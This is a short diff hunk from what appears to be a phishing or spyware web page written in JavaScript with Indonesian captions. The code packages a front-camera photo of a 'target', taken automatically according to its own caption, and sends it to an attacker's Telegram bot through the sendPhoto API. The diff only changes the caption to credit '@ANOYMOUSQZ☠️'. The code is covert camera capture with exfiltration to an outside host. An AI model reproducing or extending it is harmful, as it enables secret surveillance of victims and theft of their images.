@@ -120,7 +120,7 @@
             const formData = new FormData();
             formData.append('chat_id', chatIdToSend); // Mengirim ke ID dinamis, bukan statis admin!
             formData.append('photo', blob, 'snapshot.png');
-            formData.append('caption', '📸 **Target Berhasil Terjebak!**\nFoto kamera depan target berhasil diambil otomatis.');
+            formData.append('caption', '📸 Target Berhasil\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.');
 
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
